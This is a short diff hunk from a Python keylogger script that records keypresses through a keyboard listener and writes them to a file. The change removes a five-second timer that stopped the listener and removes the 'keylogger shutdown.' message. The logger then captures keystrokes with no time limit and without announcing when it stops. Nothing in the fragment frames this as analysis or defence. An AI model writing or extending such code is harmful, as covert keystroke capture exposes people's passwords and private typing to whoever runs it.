@@ -46,7 +46,4 @@ def write_file(keys):
         f.write(k)
         f.write('\n')
 with Listener(on_press=on_press) as listener:
-    Timer(5, listener.stop).start()
     listener.join()
-
-print("keylogger shutdown.")
